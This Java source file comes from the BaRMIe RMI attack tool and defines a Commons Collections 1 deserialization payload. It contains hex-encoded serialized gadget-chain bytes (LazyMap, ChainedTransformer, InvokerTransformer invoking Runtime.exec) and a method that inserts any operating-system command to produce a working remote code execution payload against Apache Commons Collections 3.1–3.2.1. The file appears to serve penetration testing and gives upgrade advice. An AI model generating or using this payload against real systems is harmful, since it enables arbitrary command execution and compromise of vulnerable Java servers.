package nb.barmie.modes.attack.deser.payloads;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import nb.barmie.exceptions.BaRMIeDeserPayloadGenerationException;
import nb.barmie.exceptions.BaRMIeException;
import nb.barmie.modes.attack.DeserPayload;

/***********************************************************
 * Deserialization payload for Apache Commons Collections
 * 3.1, 3.2, and 3.2.1.
 * 
 * Based on the ysoserial and the excellent work of Chris
 * Frohoff, Matthias Kaiser et al
 * (https://github.com/frohoff/ysoserial).
 * 
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class CommonsCollectionsPayload1 extends DeserPayload {
	/*******************
	 * Properties
	 ******************/
	//Payload data chunks
	private final String _header_chunk = "737200116a6176612e7574696c2e48617368536574ba44859596b8b734030000707870770c000000000010000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b707870740001417372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b7078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b7078707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d8341899020000707870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e0003707870767200116a6176612e6c616e672e52756e74696d6500000000000000000000007078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b707870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c0200007078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000707870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb3420200007078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a65637400000000000000000000007078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b470200007078700000000174";
	private final String _footer_chunk = "740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c756570787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b02000070787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c64707870000000010000000077080000001000000000787878";
	
	/*******************
	 * Set payload properties
	 ******************/
	public CommonsCollectionsPayload1() {
		super();
		this.setName("CommonsCollections1");
		this.setDescription("Apache Commons Collections 3.1, 3.2, 3.2.1");
		this.setRemediationAdvice("[Apache Commons Collections] Update to Apache Commons Collections 3.2.2 or greater.");
		this.setAffectedJars(new String[] {"commons-collections-3.1.jar", "commons-collections-3.2.jar", "commons-collections-3.2.1.jar"});
	}
	
	/*******************
	 * Generate payload bytes for the given OS command, correcting references
	 * by the given amount.
	 * 
	 * @param cmd The operating system command to execute.
	 * @param refCorrection The amount to correct TC_REFERENCE handles by (see note above).
	 * @return An array of bytes making up the deserialization payload.
	 ******************/
	public byte[] getBytes(String cmd, int refCorrection) throws BaRMIeException {
		ByteArrayOutputStream out;
		
		//Generate the payload bytes
		try {
			//Fix references in the header bytes and add them to the output
			out = new ByteArrayOutputStream();
			out.write(this.fixReferences(this.hexStrToByteArray(this._header_chunk), refCorrection));
			
			//Add the command string to the output
			out.write(this.stringToUtf8ByteArray(cmd));
			
			//Fix references in the footer bytes and add them to the output
			out.write(this.fixReferences(this.hexStrToByteArray(this._footer_chunk), refCorrection));
		} catch(IOException ioe) {
			throw new BaRMIeDeserPayloadGenerationException("Failed to build Commons Collections 1 deserialization payload.", ioe);
		}
		
		//Return the payload bytes
		return out.toByteArray();
	}
}
